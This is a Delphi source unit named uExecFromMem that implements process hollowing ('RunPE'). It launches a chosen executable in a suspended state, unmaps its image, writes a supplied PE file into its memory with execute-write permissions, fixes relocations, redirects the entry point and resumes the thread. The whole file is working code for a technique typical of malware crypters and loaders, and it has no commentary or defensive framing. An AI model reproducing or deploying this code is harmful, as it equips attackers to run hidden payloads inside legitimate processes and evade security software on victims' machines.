unit uExecFromMem;
interface
uses Windows;
function ExecuteFromMem(szFilePath:string; pFile:Pointer):DWORD;
type
  PImageBaseRelocation = ^TImageBaseRelocation;
  TImageBaseRelocation = packed record
     VirtualAddress: DWORD;
     SizeOfBlock: DWORD;
  end;
function NtUnmapViewOfSection(ProcessHandle:DWORD; BaseAddress:Pointer):DWORD; stdcall; external 'ntdll';
implementation
procedure PerformBaseRelocation(f_module: Pointer; INH:PImageNtHeaders; f_delta: Cardinal); stdcall;
var
  l_i: Cardinal;
  l_codebase: Pointer;
  l_relocation: PImageBaseRelocation;
  l_dest: Pointer;
  l_relInfo: ^Word;
  l_patchAddrHL: ^DWord;
  l_type, l_offset: integer;
begin
  l_codebase := f_module;
  if INH^.OptionalHeader.DataDirectory[5].Size > 0 then
  begin
    l_relocation := PImageBaseRelocation(Cardinal(l_codebase) + INH^.OptionalHeader.DataDirectory[5].VirtualAddress);
    while l_relocation.VirtualAddress > 0 do
    begin
      l_dest := Pointer((Cardinal(l_codebase) + l_relocation.VirtualAddress));
      l_relInfo := Pointer(Cardinal(l_relocation) + 8);
      for l_i := 0 to (trunc(((l_relocation.SizeOfBlock - 8) / 2)) - 1) do
      begin
        l_type := (l_relInfo^ shr 12);
        l_offset := l_relInfo^ and $FFF;
        if l_type = 3 then
        begin
          l_patchAddrHL := Pointer(Cardinal(l_dest) + Cardinal(l_offset));
          l_patchAddrHL^ := l_patchAddrHL^ + f_delta;
        end;
        inc(l_relInfo);
      end;
      l_relocation := Pointer(cardinal(l_relocation) + l_relocation.SizeOfBlock);
    end;
  end;
end;
function AlignImage(pImage:Pointer):Pointer;
var
  IDH:          PImageDosHeader;
  INH:          PImageNtHeaders;
  ISH:          PImageSectionHeader;
  i:            WORD;
begin
  IDH := pImage;
  INH := Pointer(DWORD(pImage) + IDH^._lfanew);
  GetMem(Result, INH^.OptionalHeader.SizeOfImage);
  ZeroMemory(Result, INH^.OptionalHeader.SizeOfImage);
  CopyMemory(Result, pImage, INH^.OptionalHeader.SizeOfHeaders);
  for i := 0 to INH^.FileHeader.NumberOfSections - 1 do
  begin
    ISH := Pointer(DWORD(pImage) + IDH^._lfanew + 248 + i * 40);
    CopyMemory(Pointer(DWORD(Result) + ISH^.VirtualAddress), Pointer(DWORD(pImage) + ISH^.PointerToRawData), ISH^.SizeOfRawData);
  end;
end;
function ExecuteFromMem(szFilePath:string; pFile:Pointer):DWORD;
var
  PI:           TProcessInformation;
  SI:           TStartupInfo;
  CT:           TContext;
  IDH:          PImageDosHeader;
  INH:          PImageNtHeaders;
  dwImageBase:  DWORD;
  pModule:      Pointer;
  dwNull:       DWORD;
begin
  Result := 0;
  IDH := pFile;
  if IDH^.e_magic = IMAGE_DOS_SIGNATURE then
  begin
    INH := Pointer(DWORD(pFile) + IDH^._lfanew);
    if INH^.Signature = IMAGE_NT_SIGNATURE then
    begin
      FillChar(SI, SizeOf(TStartupInfo), #0);
      FillChar(PI, SizeOf(TProcessInformation), #0);
      SI.cb := SizeOf(TStartupInfo);
      if CreateProcess(nil, PChar(szFilePath), nil, nil, FALSE, CREATE_SUSPENDED, nil, nil, SI, PI) then
      begin
        CT.ContextFlags := CONTEXT_FULL;
        if GetThreadContext(PI.hThread, CT) then
        begin
          ReadProcessMemory(PI.hProcess, Pointer(CT.Ebx + 8), @dwImageBase, 4, dwNull);
          if dwImageBase = INH^.OptionalHeader.ImageBase then
          begin
            if NtUnmapViewOfSection(PI.hProcess, Pointer(INH^.OptionalHeader.ImageBase)) = 0 then
              pModule := VirtualAllocEx(PI.hProcess, Pointer(INH^.OptionalHeader.ImageBase), INH^.OptionalHeader.SizeOfImage, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
            else
              pModule := VirtualAllocEx(PI.hProcess, nil, INH^.OptionalHeader.SizeOfImage, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE);
          end
          else
            pModule := VirtualAllocEx(PI.hProcess, Pointer(INH^.OptionalHeader.ImageBase), INH^.OptionalHeader.SizeOfImage, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE);
          if pModule <> nil then
          begin
            pFile := AlignImage(pFile);
            if DWORD(pModule) <> INH^.OptionalHeader.ImageBase then
            begin
              PerformBaseRelocation(pFile, INH, (DWORD(pModule) - INH^.OptionalHeader.ImageBase));
              INH^.OptionalHeader.ImageBase := DWORD(pModule);
              CopyMemory(Pointer(DWORD(pFile) + IDH^._lfanew), INH, 248);
            end;
            WriteProcessMemory(PI.hProcess, pModule, pFile, INH.OptionalHeader.SizeOfImage, dwNull);
            WriteProcessMemory(PI.hProcess, Pointer(CT.Ebx + 8), @pModule, 4, dwNull);
            CT.Eax := DWORD(pModule) + INH^.OptionalHeader.AddressOfEntryPoint;
            SetThreadContext(PI.hThread, CT);
            ResumeThread(PI.hThread);
            FreeMem(pFile, INH^.OptionalHeader.SizeOfImage);
            Result := PI.hThread;
          end;
        end;
      end;
    end;
  end;
end;
end.
